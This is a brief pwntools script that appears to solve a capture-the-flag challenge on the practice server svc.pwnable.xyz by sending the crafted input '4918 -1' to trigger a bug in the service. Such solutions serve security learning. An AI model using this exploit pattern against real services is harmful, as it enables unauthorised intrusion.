from pwn import *

p=remote("svc.pwnable.xyz",30001)

context.log_level='debug'

p.readuntil("input: ")
p.writeline("4918 -1")
p.recv()
p.close()
